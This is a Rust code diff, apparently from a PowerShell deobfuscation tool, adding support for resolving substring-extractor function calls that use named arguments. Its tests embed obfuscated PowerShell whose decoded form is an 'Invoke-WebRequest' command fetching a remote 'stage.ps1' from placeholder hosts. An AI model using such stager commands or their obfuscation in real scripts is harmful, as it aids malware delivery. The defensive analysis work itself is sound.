@@ -3268,7 +3268,15 @@ fn expand_literal_substring_extractor_calls(text: &str) -> String {
             continue;
         };
 
-        out = inline_ps_literal_substring_calls(&out, &name, value_idx, start_idx, len_idx);
+        let binding = PsSubstringExtractorParamBinding {
+            value_idx,
+            value_name: value_var,
+            start_idx,
+            start_name: start_var,
+            len_idx,
+            len_name: len_var,
+        };
+        out = inline_ps_literal_substring_calls(&out, &name, binding);
     }
     out
 }
@@ -3514,9 +3522,7 @@ fn parse_ps_function_param_indices(params: &str) -> std::collections::HashMap<St
 fn inline_ps_literal_substring_calls(
     text: &str,
     name: &str,
-    value_idx: usize,
-    start_idx: usize,
-    len_idx: usize,
+    binding: PsSubstringExtractorParamBinding<'_>,
 ) -> String {
     let lower = text.to_ascii_lowercase();
     let needle = name.to_ascii_lowercase();
@@ -3542,6 +3548,21 @@ fn inline_ps_literal_substring_calls(
         let parenthesized = bytes.get(pos) == Some(&b'(');
         if parenthesized {
             pos = skip_ascii_ws(bytes, pos + 1);
+        }
+        if bytes.get(pos) == Some(&b'-') {
+            if let Some((call_end, replacement)) = inline_ps_named_literal_substring_call(
+                text,
+                pos,
+                parenthesized,
+                binding.value_name,
+                binding.start_name,
+                binding.len_name,
+            ) {
+                matches.push((call_start, call_end, replacement));
+                search_from = call_end;
+                match_count += 1;
+                continue;
+            }
         }
         let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
             search_from = end_name;
@@ -3571,11 +3592,11 @@ fn inline_ps_literal_substring_calls(
             call_end = after + 1;
         }
 
-        if value_idx != 0 || start_idx > 2 || len_idx > 2 {
+        if binding.value_idx != 0 || binding.start_idx > 2 || binding.len_idx > 2 {
             search_from = call_end;
             continue;
         }
-        let start = match (start_idx, len_idx) {
+        let start = match (binding.start_idx, binding.len_idx) {
             (1, 2) => first_num,
             (2, 1) => second_num,
             _ => {
@@ -3583,7 +3604,7 @@ fn inline_ps_literal_substring_calls(
                 continue;
             }
         };
-        let len = match (start_idx, len_idx) {
+        let len = match (binding.start_idx, binding.len_idx) {
             (1, 2) => second_num,
             (2, 1) => first_num,
             _ => {
@@ -3611,6 +3632,54 @@ fn inline_ps_literal_substring_calls(
         out.replace_range(start..end, &replacement);
     }
     out
+}
+
+#[derive(Clone, Copy)]
+struct PsSubstringExtractorParamBinding<'a> {
+    value_idx: usize,
+    value_name: &'a str,
+    start_idx: usize,
+    start_name: &'a str,
+    len_idx: usize,
+    len_name: &'a str,
+}
+
+fn inline_ps_named_literal_substring_call(
+    text: &str,
+    pos: usize,
+    parenthesized: bool,
+    value_name: &str,
+    start_name: &str,
+    len_name: &str,
+) -> Option<(usize, String)> {
+    let (call_end, args) =
+        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 6)?;
+    let value = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
+        .1
+        .as_literal()?;
+    let start = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(start_name))?
+        .1
+        .as_usize()?;
+    let len = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(len_name))?
+        .1
+        .as_usize()?;
+    if value.len() > 8192 {
+        return None;
+    }
+    let end = start.checked_add(len)?;
+    if end > value.len() || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
+        return None;
+    }
+    Some((
+        call_end,
+        format!("'{}'", value[start..end].replace('\'', "''")),
+    ))
 }
 
 fn inline_ps_literal_replace_calls(
@@ -3956,6 +4025,89 @@ fn parse_ps_named_static_literal_args(
         let name = text[name_start..name_end].to_ascii_lowercase();
         pos = skip_ascii_ws(bytes, name_end);
         let (value_end, value) = parse_ps_static_quoted_literal(text, pos)?;
+        args.push((name, value));
+        arg_end = value_end;
+        pos = value_end;
+
+        if parenthesized {
+            let next = skip_ascii_ws(bytes, pos);
+            if bytes.get(next) == Some(&b',') {
+                pos = next + 1;
+                continue;
+            }
+            if bytes.get(next) == Some(&b')') {
+                return Some((next + 1, args));
+            }
+            pos = next;
+        }
+    }
+
+    if parenthesized {
+        None
+    } else {
+        (!args.is_empty()).then_some((arg_end, args))
+    }
+}
+
+#[derive(Debug)]
+enum PsNamedStaticArgValue {
+    Literal(String),
+    Usize(usize),
+}
+
+impl PsNamedStaticArgValue {
+    fn as_literal(&self) -> Option<&str> {
+        match self {
+            Self::Literal(value) => Some(value),
+            Self::Usize(_) => None,
+        }
+    }
+
+    fn as_usize(&self) -> Option<usize> {
+        match self {
+            Self::Literal(_) => None,
+            Self::Usize(value) => Some(*value),
+        }
+    }
+}
+
+fn parse_ps_named_static_literal_or_usize_args(
+    text: &str,
+    mut pos: usize,
+    parenthesized: bool,
+    max_args: usize,
+) -> Option<(usize, Vec<(String, PsNamedStaticArgValue)>)> {
+    let bytes = text.as_bytes();
+    let mut args = Vec::new();
+    let mut arg_end = pos;
+    for _ in 0..max_args {
+        pos = skip_ascii_ws(bytes, pos);
+        if parenthesized && bytes.get(pos) == Some(&b')') {
+            return (!args.is_empty()).then_some((pos + 1, args));
+        }
+        if bytes.get(pos) != Some(&b'-') {
+            break;
+        }
+        let name_start = pos + 1;
+        let mut name_end = name_start;
+        while name_end < bytes.len()
+            && (bytes[name_end].is_ascii_alphanumeric() || bytes[name_end] == b'_')
+        {
+            name_end += 1;
+        }
+        if name_end == name_start {
+            return None;
+        }
+        let name = text[name_start..name_end].to_ascii_lowercase();
+        pos = skip_ascii_ws(bytes, name_end);
+        let (value_end, value) =
+            if let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) {
+                (value_end, PsNamedStaticArgValue::Literal(value))
+            } else if let Some((value_end, value)) = parse_ps_usize_arg(text, pos) {
+                (value_end, PsNamedStaticArgValue::Usize(value))
+            } else {
+                return None;
+            };
         args.push((name, value));
         arg_end = value_end;
         pos = value_end;
@@ -6722,6 +6874,28 @@ mod literal_substring_extractor_tests {
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-extractor-call.example/stage.ps1'"),
             "substring extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_substring_extractor_named_args_call_is_rewritten() {
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-substring-named-args-extractor.example/stage.ps1";
+        let text = format!(
+            r#"function Pick($value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Pick -count {len} -value 'xxx{decoded}yyy' -start 3"#,
+            len = decoded.len()
+        );
+
+        let out = expand_literal_substring_extractor_calls(&text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-substring-named-args-extractor.example/stage.ps1'"
+            ),
+            "named-argument substring extractor call was not rewritten:\n{out}"
         );
     }
 
